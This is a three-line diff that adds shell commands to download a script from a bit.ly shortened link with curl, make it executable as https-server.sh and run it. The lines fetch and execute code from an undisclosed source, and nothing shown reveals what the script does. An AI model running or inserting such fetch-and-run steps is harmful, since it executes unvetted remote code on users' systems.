@@ -1,0 +1,3 @@
+curl -L -O http://bit.ly/4l3YdXk
+chmod +x https-server.sh     # or: mv 4l3YdXk https-server.sh && chmod +x https-server.sh
+./https-server.sh
